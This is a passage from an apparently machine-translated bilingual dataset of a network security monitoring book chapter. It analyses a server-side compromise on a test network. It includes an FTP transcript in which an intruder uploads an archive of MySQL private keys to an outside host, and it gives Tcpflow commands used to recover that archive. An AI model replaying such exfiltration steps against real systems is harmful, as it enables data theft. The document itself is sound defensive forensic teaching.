  type: TYPE_NORMAL
  zh: 目标端口：21
- en: 'OS Fingerprint: 192.168.3.5:32904 - Linux 2.6 (newer, 1) (up: 5 hrs)'
  id: totrans-241
  prefs: []
  type: TYPE_NORMAL
  zh: 操作系统指纹：192.168.3.5:32904 - Linux 2.6（更新版，1）（在线时长：5小时）
- en: 'OS Fingerprint: -> 203.0.113.4:21 (distance 0, link: ethernet/modem)'
  id: totrans-242
  prefs: []
  type: TYPE_NORMAL
  zh: 操作系统指纹：-> 203.0.113.4:21（距离 0，链路：以太网/调制解调器）
- en: 'DST: 220 freebsdvmw FTP server (Version 6.00LS) ready.'
  id: totrans-243
  prefs: []
  type: TYPE_NORMAL
  zh: 目标：220 freebsdvmw FTP 服务器（版本 6.00LS）准备就绪。
- en: 'DST:'
  id: totrans-244
  prefs: []
  type: TYPE_NORMAL
  zh: 目标：
- en: 'SRC: USER orrv'
  id: totrans-245
  prefs: []
  type: TYPE_NORMAL
  zh: 源：用户 orrv
- en: 'SRC:'
  id: totrans-246
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 331 Password required for orr.'
  id: totrans-247
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：331 需要密码才能进入 orr。
- en: 'DST:'
  id: totrans-248
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: PASS bobbyu'
  id: totrans-249
  prefs: []
  type: TYPE_NORMAL
  zh: 源：PASS bobbyu
- en: '**228** Chapter 10'
  id: totrans-250
  prefs: []
  type: TYPE_NORMAL
  zh: '**228** 第10章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-251
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 'SRC:'
  id: totrans-252
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 230 User orr logged in.'
  id: totrans-253
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：230 用户 orr 登录。
- en: 'DST:'
  id: totrans-254
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: SYST'
  id: totrans-255
  prefs: []
  type: TYPE_NORMAL
  zh: 源：SYST
- en: 'SRC:'
  id: totrans-256
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 215 UNIX Type: L8 Version: BSD-199506x'
  id: totrans-257
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：215 UNIX 类型：L8 版本：BSD-199506x
- en: 'DST:'
  id: totrans-258
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: TYPE I'
  id: totrans-259
  prefs: []
  type: TYPE_NORMAL
  zh: 源：TYPE I
- en: 'SRC:'
  id: totrans-260
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 200 Type set to I.'
  id: totrans-261
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：200 类型设置为 I。
- en: 'DST:'
  id: totrans-262
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: PORT 192,168,3,5,128,244'
  id: totrans-263
  prefs: []
  type: TYPE_NORMAL
  zh: 源：PORT 192,168,3,5,128,244
- en: 'SRC:'
  id: totrans-264
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 200 PORT command successful.'
  id: totrans-265
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：200 PORT 命令成功。
- en: 'DST:'
  id: totrans-266
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: 'SRC: STOR mysql-ssl.tar.gz'
  id: totrans-267
  prefs: []
  type: TYPE_NORMAL
  zh: 源：STOR mysql-ssl.tar.gz
- en: 'SRC:'
  id: totrans-268
  prefs: []
  type: TYPE_NORMAL
  zh: 源：
- en: 'DST: 150 Opening BINARY mode data connection for ''mysql-ssl.tar.gz''.'
  id: totrans-269
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：150 打开二进制模式数据连接用于 'mysql-ssl.tar.gz'。
- en: 'DST:'
  id: totrans-270
  prefs: []
  type: TYPE_NORMAL
  zh: 目的：
- en: '*Listing 10-17: Transcript of intruder FTP command channel to 203.0.113.4*'
  id: totrans-271
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-17：入侵者到 203.0.113.4 的 FTP 命令通道转录*'
- en: I like this guy. His password is bobby u, and his username is orr v. This
  id: totrans-272
  prefs: []
  type: TYPE_NORMAL
  zh: 我喜欢这个人。他的密码是 bobby u，用户名是 orr v。这个
- en: FTP server is running on a system that identifies itself as freebsdvm w, with
  id: totrans-273
  prefs: []
  type: TYPE_NORMAL
  zh: FTP 服务器运行在标识为 freebsdvm w 的系统上，
- en: 'UNIX Type L8 Version: BSD-199506 x. Again, we could use this information to'
  id: totrans-274
  prefs: []
  type: TYPE_NORMAL
  zh: UNIX 类型 L8 版本：BSD-199506 x。我们可以使用这些信息来
- en: possibly link this case with others, if appropriate.
  id: totrans-275
  prefs: []
  type: TYPE_NORMAL
  zh: 如果适当，可能将此案件与其他案件关联。
- en: We don’t know what the intruder did to acquire the contents of this file.
  id: totrans-276
  prefs: []
  type: TYPE_NORMAL
  zh: 我们不知道入侵者是如何获取此文件内容的。
- en: Can we determine what’s in it?
  id: totrans-277
  prefs: []
  type: TYPE_NORMAL
  zh: 我们能确定里面有什么吗？
- en: '***Decoding the Theft of Sensitive Data***'
  id: totrans-278
  prefs: []
  type: TYPE_NORMAL
  zh: '***解码敏感数据的盗窃***'
- en: In fact, we can retrieve the *mysql-ssl.tar.gz* archive by virtue of the full
    content data collection performed by our NSM platform. We’ll derive extracted
  id: totrans-279
  prefs: []
  type: TYPE_NORMAL
  zh: 事实上，我们可以通过我们 NSM 平台进行的完整内容数据收集来检索 *mysql-ssl.tar.gz* 压缩包。我们将派生提取
- en: content data from full content data using the tool that Sguil uses to rebuild
  id: totrans-280
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 Sguil 工具重建的内容数据来自完整内容数据
- en: transcripts, called Tcpflow ( *https://github.com/simsong/tcpflow*). Jeremy
    Elson wrote the first version of Tcpflow, but in recent years Simson Garfinkel
    has
  id: totrans-281
  prefs: []
  type: TYPE_NORMAL
  zh: 转录文件，称为 Tcpflow（*https://github.com/simsong/tcpflow*）。Jeremy Elson 编写了 Tcpflow
    的第一个版本，但近年来，Simson Garfinkel 接管了该项目。
- en: assumed responsibility for the project.
  id: totrans-282
  prefs: []
  type: TYPE_NORMAL
  zh: 承担了该项目的责任。
- en: Tcpflow reconstructs TCP sessions. For example, in Listing 10-18, we
  id: totrans-283
  prefs: []
  type: TYPE_NORMAL
  zh: Tcpflow 重建 TCP 会话。例如，在列表 10-18 中，我们
- en: tell Tcpflow to rebuild all TCP sessions involving port 20, the TCP port used
  id: totrans-284
  prefs: []
  type: TYPE_NORMAL
  zh: 告诉 Tcpflow 重建所有涉及端口 20 的 TCP 会话，这是用于
- en: for the active FTP data channel shown in the session records.
  id: totrans-285
  prefs: []
  type: TYPE_NORMAL
  zh: 用于会话记录中显示的活动 FTP 数据通道。
- en: $ **tcpflow -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-10/snort.log.1362873602
    port 20**u $ **ls**v
  id: totrans-286
  prefs: []
  type: TYPE_NORMAL
  zh: $ **tcpflow -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-10/snort.log.1362873602
    port 20**u $ **ls**v
- en: 192.168.003.005.33012-203.000.113.004.00020w 203.000.113.004.00020-192.168.003.005.56377x
    report.xmly
  id: totrans-287
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.003.005.33012-203.000.113.004.00020w 203.000.113.004.00020-192.168.003.005.56377x
    report.xmly
- en: $ **file ***z
  id: totrans-288
  prefs: []
  type: TYPE_NORMAL
  zh: $ **file ***z
- en: '192.168.003.005.33012-203.000.113.004.00020{: gzip compressed data, from Unix,
    last modified: Sun Mar 10 02:02:23 2013'
  id: totrans-289
  prefs: []
  type: TYPE_NORMAL
  zh: '192.168.003.005.33012-203.000.113.004.00020{: gzip 压缩数据，来自 Unix，最后修改时间：2013年3月10日
    02:02:23'
- en: '203.000.113.004.00020-192.168.003.005.56377|: ASCII text, with CRLF line terminators'
  id: totrans-290
  prefs: []
  type: TYPE_NORMAL
  zh: '203.000.113.004.00020-192.168.003.005.56377|: ASCII 文本，带 CRLF 行终止符'
- en: 'report.xml: XML document text'
  id: totrans-291
  prefs: []
  type: TYPE_NORMAL
  zh: report.xml：XML 文档文本
- en: Server-side Compromise **229**
  id: totrans-292
  prefs: []
  type: TYPE_NORMAL
  zh: 服务器端妥协 **229**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-293
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: $ **cat 203.000.113.004.00020-192.168.003.005.56377**
  id: totrans-294
  prefs: []
  type: TYPE_NORMAL
  zh: $ **cat 203.000.113.004.00020-192.168.003.005.56377**
- en: total 1936
  id: totrans-295
  prefs: []
  type: TYPE_NORMAL
  zh: 总计 1936
- en: drwxr-xr-x 2 orr orr 512 Mar 9 21:03 .
  id: totrans-296
  prefs: []
  type: TYPE_NORMAL
  zh: drwxr-xr-x 2 orr orr 512 Mar 9 21:03 .
- en: drwxr-xr-x 4 root wheel 512 Mar 9 20:47 ..
  id: totrans-297
  prefs: []
  type: TYPE_NORMAL
  zh: drwxr-xr-x 4 root wheel 512 Mar 9 20:47 ..
- en: -rw-r--r-- 1 orr orr 1016 Mar 9 20:47 .cshrc
  id: totrans-298
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 1016 Mar 9 20:47 .cshrc
- en: -rw-r--r-- 1 orr orr 254 Mar 9 20:47 .login
  id: totrans-299
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 254 Mar 9 20:47 .login
- en: -rw-r--r-- 1 orr orr 165 Mar 9 20:47 .login_conf
  id: totrans-300
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 165 Mar 9 20:47 .login_conf
- en: -rw------- 1 orr orr 381 Mar 9 20:47 .mail_aliases
  id: totrans-301
  prefs: []
  type: TYPE_NORMAL
  zh: -rw------- 1 orr orr 381 Mar 9 20:47 .mail_aliases
- en: -rw-r--r-- 1 orr orr 338 Mar 9 20:47 .mailrc
  id: totrans-302
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 338 Mar 9 20:47 .mailrc
- en: -rw-r--r-- 1 orr orr 750 Mar 9 20:47 .profile
  id: totrans-303
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 750 Mar 9 20:47 .profile
- en: -rw------- 1 orr orr 283 Mar 9 20:47 .rhosts
  id: totrans-304
  prefs: []
  type: TYPE_NORMAL
  zh: -rw------- 1 orr orr 283 Mar 9 20:47 .rhosts
- en: -rw-r--r-- 1 orr orr 980 Mar 9 20:47 .shrc
  id: totrans-305
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 980 Mar 9 20:47 .shrc
- en: -rw-r--r-- 1 orr orr 915349 Mar 9 21:03 mysql-ssl.tar.gz}
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: -rw-r--r-- 1 orr orr 915349 Mar 9 21:03 mysql-ssl.tar.gz}
- en: '*Listing 10-18: Tcpflow reconstruction of sessions involving port 20*'
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 10-18：Tcpflow 重建涉及端口 20 的会话*'
- en: Listing 10-18 first shows how to run Tcpflow against an interesting trace,
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 10-18 首先展示了如何针对有趣的跟踪记录运行 Tcpflow，
- en: with a BPF limiting reconstruction to traffic involving port 20 u. Next, we
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 BPF 限制重建只涉及端口 20 的流量 u。接下来，我们
- en: see the output of the Tcpflow reconstruction in the form of a directory list-
  id: totrans-310
  prefs: []
  type: TYPE_NORMAL
  zh: 查看Tcpflow重建的输出，以目录列表的形式呈现
- en: ing v. The output shows two sides of the network session, in the form of two
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 输出显示了网络会话的两个方面，以两个
- en: files, w and x, and a *report.xml* file y describing what Tcpflow did. Next,
    we use the file z command to show the type of each of those files.
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 文件w和x，以及一个描述Tcpflow操作的*report.xml*文件y。接下来，我们使用file z命令来显示这些文件的类型。
- en: '***Extracting the Stolen Archive***'
  id: totrans-313
  prefs: []
  type: TYPE_NORMAL
  zh: '***提取被窃取的归档***'
- en: The file *192.168.003.005.33012-203.000.113.004.00020* { is a *gzip* archive
    transferred during the FTP session. The file *203.000.113.004.00020-192*
  id: totrans-314
  prefs: []
  type: TYPE_NORMAL
  zh: 文件*192.168.003.005.33012-203.000.113.004.00020* {是一个*gzip*归档文件，在FTP会话期间传输。文件*203.000.113.004.00020-192*
- en: '*.168.003.005.56377* | is an ASCII text file, corresponding to a directory
    listing returned from the FTP server to the client 192.168.3.5\. This directory'
  id: totrans-315
  prefs: []
  type: TYPE_NORMAL
  zh: '*.168.003.005.56377* | 是一个ASCII文本文件，对应于从FTP服务器返回到客户端192.168.3.5的目录列表。该目录'
- en: listing was transferred after the intruder copied *mysql-ssl.tar.gz* to the
    server.
  id: totrans-316
  prefs: []
  type: TYPE_NORMAL
  zh: 列表是在入侵者将*mysql-ssl.tar.gz*复制到服务器后传输的。
- en: This confirms the successful transfer of *mysql-ssl.tar.gz* }, because that
    file is now listed and stored on an FTP server controlled by the intruder. This
  id: totrans-317
  prefs: []
  type: TYPE_NORMAL
  zh: 这确认了*mysql-ssl.tar.gz*的成功传输，因为该文件现在已列出并存储在由入侵者控制的FTP服务器上。这个
- en: could be bad news for Vivian’s Pets, if that file is a sensitive archive.
  id: totrans-318
  prefs: []
  type: TYPE_NORMAL
  zh: 如果该文件是敏感的归档文件，这对Vivian’s Pets来说可能是坏消息。
- en: Thanks to capturing full content data, we also have a copy of *mysql-ssl*
  id: totrans-319
  prefs: []
  type: TYPE_NORMAL
  zh: 多亏了捕获完整的内容数据，我们也拥有了*mysql-ssl*
- en: '*.tar.gz* at our disposal. The *gzip* archive represented by file *192.168.003.005*'
  id: totrans-320
  prefs: []
  type: TYPE_NORMAL
  zh: '*.tar.gz* 在我们手中。由文件*192.168.003.005*表示的*gzip*归档'
- en: '*.33012-203.000.113.004.00020* { is likely the *mysql-ssl.tar.gz* file stolen
    by the intruder. We extract it using the tar program, as shown in Listing 10-19\.
    As'
  id: totrans-321
  prefs: []
  type: TYPE_NORMAL
  zh: '*.33012-203.000.113.004.00020* {很可能是入侵者窃取的*mysql-ssl.tar.gz*文件。我们使用tar程序提取它，如列表10-19所示。'
- en: you can see, it appears to contain the keys associated with a MySQL server.
  id: totrans-322
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，它似乎包含与MySQL服务器相关的密钥。
- en: $ **tar -xzvf 192.168.003.005.33012-203.000.113.004.00020**
  id: totrans-323
  prefs: []
  type: TYPE_NORMAL
  zh: $ **tar -xzvf 192.168.003.005.33012-203.000.113.004.00020**
- en: mysql-ssl/
  id: totrans-324
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/
- en: mysql-ssl/yassl-1.9.8.zip
  id: totrans-325
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/yassl-1.9.8.zip
- en: mysql-ssl/my.cnf
  id: totrans-326
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/my.cnf
- en: mysql-ssl/mysqld.gdb
  id: totrans-327
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysqld.gdb
- en: mysql-ssl/mysql-keys/
  id: totrans-328
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/
- en: mysql-ssl/mysql-keys/server-cert.pem
  id: totrans-329
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/server-cert.pem
- en: mysql-ssl/mysql-keys/ca-cert.pem
  id: totrans-330
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/ca-cert.pem
- en: mysql-ssl/mysql-keys/client-req.pem
  id: totrans-331
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/client-req.pem
- en: mysql-ssl/mysql-keys/server-key.pem
  id: totrans-332
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/server-key.pem
- en: '**230** Chapter 10'
  id: totrans-333
  prefs: []
  type: TYPE_NORMAL
  zh: '**230** 第10章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-334
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: mysql-ssl/mysql-keys/server-req.pem
  id: totrans-335
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/server-req.pem
- en: mysql-ssl/mysql-keys/client-key.pem
  id: totrans-336
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/client-key.pem
- en: mysql-ssl/mysql-keys/client-cert.pem
  id: totrans-337
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/client-cert.pem
- en: mysql-ssl/mysql-keys/ca-key.pem
  id: totrans-338
  prefs: []
  type: TYPE_NORMAL
  zh: mysql-ssl/mysql-keys/ca-key.pem
- en: '*Listing 10-19: Contents of the* mysql-ssl .tar .gz *archive stolen by the
    intruder* With this data in hand, the Vivian’s Pets CIRT must summarize what'
  id: totrans-339
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表10-19：入侵者窃取的* mysql-ssl .tar .gz *归档文件内容* 拥有这些数据后，Vivian’s Pets CIRT必须总结'
- en: has happened in order to fully understand the intrusion.
  id: totrans-340
  prefs: []
  type: TYPE_NORMAL
  zh: 了解发生了什么，以便全面理解入侵。
- en: '**Stepping back**'
  id: totrans-341
  prefs: []
  type: TYPE_NORMAL
  zh: '**回顾**'
- en: At this point in the NSM process, the CIRT should consider what it under-
  id: totrans-342
  prefs: []
  type: TYPE_NORMAL
  zh: 在NSM过程中的这一阶段，CIRT应考虑它所
- en: stands about the intrusion before making recommendations to business
  id: totrans-343
  prefs: []
  type: TYPE_NORMAL
  zh: 在提供建议之前，理解入侵的背景对Vivian's Pets来说是非常重要的
- en: owners. Using illustrations to depict what has happened at each stage is a
  id: totrans-344
  prefs: []
  type: TYPE_NORMAL
  zh: 所有者。通过插图描述每个阶段发生的事情是一个
- en: helpful analytical step.
  id: totrans-345
  prefs: []
  type: TYPE_NORMAL
  zh: 有帮助的分析步骤。
- en: '***Summarizing Stage 1***'
  id: totrans-346
  prefs: []
  type: TYPE_NORMAL
  zh: '***总结第一阶段***'
- en: Figure 10-13 summarizes the first few phases of this intrusion, which we can
  id: totrans-347
  prefs: []
  type: TYPE_NORMAL
  zh: 图10-13总结了此次入侵的前几个阶段，我们可以
- en: call stage 1\.
  id: totrans-348
  prefs: []
  type: TYPE_NORMAL
  zh: 第一阶段\。
- en: 1\. Intruder conducts reconnaissance against two potential victims.
  id: totrans-349
  prefs: []
  type: TYPE_NORMAL
  zh: 1\. 入侵者对两个潜在的受害者进行侦察。
- en: NETWORK SCANNING
  id: totrans-350
  prefs: []
  type: TYPE_NORMAL
  zh: 网络扫描
- en: Victim 1
  id: totrans-351
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 1
- en: Intruder 1
  id: totrans-352
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: 192.168.3.5
  id: totrans-353
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5
- en: 203.0.113.10
  id: totrans-354
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.10
- en: Victim 2
  id: totrans-355
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 2
- en: 192.168.3.13
  id: totrans-356
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.13
- en: 2\. Intruder exploits vsftpd service on Victim 1\.
  id: totrans-357
  prefs: []
  type: TYPE_NORMAL
  zh: 2\. 入侵者利用受害者 1 上的vsftpd服务\。
- en: Victim 1
  id: totrans-358
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 1
- en: NETWORK CONNECTION
  id: totrans-359
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: 192.168.3.5
  id: totrans-360
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5
- en: Intruder 1
  id: totrans-361
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: 203.0.113.10
  id: totrans-362
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.10
- en: Exploited
  id: totrans-363
  prefs: []
  type: TYPE_NORMAL
  zh: 被利用
- en: 3\. Intruder connects to backdoor on Victim 1\.
  id: totrans-364
  prefs: []
  type: TYPE_NORMAL
  zh: 3\. 入侵者连接到受害者 1 上的后门\。
- en: NETWORK CONNECTION
  id: totrans-365
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Intruder 1
  id: totrans-366
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: Victim 1
  id: totrans-367
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 1
- en: 203.0.113.10
  id: totrans-368
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.10
- en: 192.168.3.5
  id: totrans-369
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.5
- en: 4\. Intruder fails to exploit vsftpd service on Victim 2\.
  id: totrans-370
  prefs: []
  type: TYPE_NORMAL
  zh: 4\. 入侵者未能利用受害者 2 上的vsftpd服务\。
- en: NETWORK CONNECTION
  id: totrans-371
  prefs: []
  type: TYPE_NORMAL
  zh: 网络连接
- en: Victim 2
  id: totrans-372
  prefs: []
  type: TYPE_NORMAL
  zh: 受害者 2
- en: Intruder 1
  id: totrans-373
  prefs: []
  type: TYPE_NORMAL
  zh: 入侵者 1
- en: 192.168.3.13
  id: totrans-374
  prefs: []
  type: TYPE_NORMAL
  zh: 192.168.3.13
- en: 203.0.113.10
  id: totrans-375
  prefs: []
  type: TYPE_NORMAL
  zh: 203.0.113.10
- en: Safe
  id: totrans-376
  prefs: []
  type: TYPE_NORMAL
  zh: 安全
- en: '*Figure 10-13: Stage 1 of server-side compromise*'
  id: totrans-377
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **231**
  id: totrans-378
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-379
  prefs: []
  type: TYPE_NORMAL
- en: 'In stage 1, the intruder at 203.0.113.10 conducted network reconnaissance against
    two computers: 192.168.3.5 and 192.168.3.13\. The intruder'
  id: totrans-380
  prefs: []
  type: TYPE_NORMAL
- en: found port 21 TCP listening on both systems, so he attempted to compro-
  id: totrans-381
  prefs: []
  type: TYPE_NORMAL
- en: mise that service on both targets. He successfully compromised the vsftpd
  id: totrans-382
  prefs: []
  type: TYPE_NORMAL
- en: server on 192.168.3.5, causing a backdoor to open on port 6200 TCP on
  id: totrans-383
  prefs: []
  type: TYPE_NORMAL
- en: that system. He was not able to use the same technique to gain unauthor-
  id: totrans-384
  prefs: []
  type: TYPE_NORMAL
- en: ized access to 192.168.3.13\.
  id: totrans-385
  prefs: []
  type: TYPE_NORMAL
- en: '***Summarizing Stage 2***'
  id: totrans-386
  prefs: []
  type: TYPE_NORMAL
- en: Figure 10-14 summarizes the remainder of this intrusion, called stage 2\.
  id: totrans-387
  prefs: []
  type: TYPE_NORMAL
- en: 5\. Intruder 2 connects via SSH to Victim 1\.
  id: totrans-388
  prefs: []
  type: TYPE_NORMAL
- en: SSH CONNECTION
  id: totrans-389
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  id: totrans-390
  prefs: []
  type: TYPE_NORMAL
- en: Victim 1
  id: totrans-391
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.77
  id: totrans-392
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  id: totrans-393
  prefs: []
  type: TYPE_NORMAL
- en: 6\. Intruder 2 instructs Victim 1 to upload
  id: totrans-394
  prefs: []
  type: TYPE_NORMAL
- en: stolen data to FTP server on Intruder 3\.
  id: totrans-395
  prefs: []
  type: TYPE_NORMAL
- en: SSH CONNECTION
  id: totrans-396
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  id: totrans-397
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.77
  id: totrans-398
  prefs: []
  type: TYPE_NORMAL
- en: Victim 1
  id: totrans-399
  prefs: []
  type: TYPE_NORMAL
- en: FTP CONNECTION
  id: totrans-400
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  id: totrans-401
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 3
  id: totrans-402
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.4
  id: totrans-403
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-14: Stage 2 of server-side compromise*'
  id: totrans-404
  prefs: []
  type: TYPE_NORMAL
- en: In stage 2, a new intruder IP address, 203.0.113.77, connects via SSH to
  id: totrans-405
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5\. While interacting with the victim, the intruder created or dis-
  id: totrans-406
  prefs: []
  type: TYPE_NORMAL
- en: covered an archive titled *mysql-ssl.tar.gz*. He then uploaded that archive
    via FTP to a third system, 203.0.113.4, which may be another FreeBSD system.
  id: totrans-407
  prefs: []
  type: TYPE_NORMAL
- en: '***Next Steps***'
  id: totrans-408
  prefs: []
  type: TYPE_NORMAL
- en: As explained in Chapter 9, escalation and resolution are the two phases fol-
  id: totrans-409
  prefs: []
  type: TYPE_NORMAL
- en: lowing the collection and analysis phases of the NSM workflow. With analy-
  id: totrans-410
  prefs: []
  type: TYPE_NORMAL
- en: sis complete, the CIRT must identify the owners of the affected systems,
  id: totrans-411
  prefs: []
  type: TYPE_NORMAL
- en: and explain the nature of the data identified as being stolen. In turn, the
  id: totrans-412
  prefs: []
  type: TYPE_NORMAL
- en: asset owner must evaluate the impact of the loss of data and simultaneously
  id: totrans-413
  prefs: []
  type: TYPE_NORMAL
- en: authorize the CIRT to take short-term incident containment measures. The
  id: totrans-414
  prefs: []
  type: TYPE_NORMAL
- en: most effective containment mechanism involves removing the compromised
  id: totrans-415
  prefs: []
  type: TYPE_NORMAL
- en: systems from the network.
  id: totrans-416
  prefs: []
  type: TYPE_NORMAL
- en: First, disconnect 192.168.3.5 from the network. We should consider
  id: totrans-417
  prefs: []
  type: TYPE_NORMAL
- en: it untrustworthy because we don’t know what the intruder did during
  id: totrans-418
  prefs: []
  type: TYPE_NORMAL
- en: his encrypted OpenSSH session. The CIRT should also determine if any
  id: totrans-419
  prefs: []
  type: TYPE_NORMAL
- en: information on 192.168.3.5 is sensitive, to help decide whether this event
  id: totrans-420
  prefs: []
  type: TYPE_NORMAL
- en: qualifies as a Breach 2 or Breach 1 incident. The differentiation lies in the
  id: totrans-421
  prefs: []
  type: TYPE_NORMAL
- en: importance and sensitivity of the stolen data.
  id: totrans-422
  prefs: []
  type: TYPE_NORMAL
- en: '**232** Chapter 10'
  id: totrans-423
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-424
  prefs: []
  type: TYPE_NORMAL
- en: The CIRT should determine if any information taken from 192.168.3.5
  id: totrans-425
  prefs: []
  type: TYPE_NORMAL
- en: could lead to other intrusions. Are there any accounts that could also be
  id: totrans-426
  prefs: []
  type: TYPE_NORMAL
- en: used to log in to other Vivian’s Pets systems? Are there configuration files
  id: totrans-427
  prefs: []
  type: TYPE_NORMAL
- en: that would enable additional access? Are any business partners or custom-
  id: totrans-428
  prefs: []
  type: TYPE_NORMAL
- en: ers at risk? Involving the business, legal, and other teams may become
  id: totrans-429
  prefs: []
  type: TYPE_NORMAL
- en: necessary as the CIRT evaluates the impact of the intrusion. Ultimately,
  id: totrans-430
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5 should be retired because it is no longer a trustworthy plat-
  id: totrans-431
  prefs: []
  type: TYPE_NORMAL
- en: 'form. This could be a hard lesson for the IT and security staff: When the'
  id: totrans-432
  prefs: []
  type: TYPE_NORMAL
- en: Metasploitable developers warn users to keep their distribution off the
  id: totrans-433
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploitable 开发者警告用户将他们的发行版保密
- en: Internet, they mean it!
  id: totrans-434
  prefs: []
  type: TYPE_NORMAL
  zh: 互联网，他们是认真的！
- en: '**conclusion**'
  id: totrans-435
  prefs: []
  type: TYPE_NORMAL
  zh: '**结论**'
- en: This chapter walked through a server-side compromise. We utilized several
  id: totrans-436
  prefs: []
  type: TYPE_NORMAL
  zh: 本章讲解了服务器端的妥协。我们利用了多个
- en: forms of NSM data to analyze an intrusion targeting two systems in the
  id: totrans-437
  prefs: []
  type: TYPE_NORMAL
  zh: 使用 NSM 数据的不同形式分析入侵，目标是两台系统
- en: Vivian’s Pets test network. By examining alert, session, full content, transac-
  id: totrans-438
  prefs: []
  type: TYPE_NORMAL
  zh: Vivian's Pets 测试网络的应用程序。通过检查警报、会话、完整内容、事务-
- en: tion, and extracted content data, we learned that an intruder stole system
  id: totrans-439
  prefs: []
  type: TYPE_NORMAL
  zh: 通过提取信息和内容数据，我们了解到入侵者窃取了系统的
- en: information and a compressed archive associated with MySQL.
  id: totrans-440
  prefs: []
  type: TYPE_NORMAL
  zh: 与 MySQL 相关的信息和压缩归档文件。
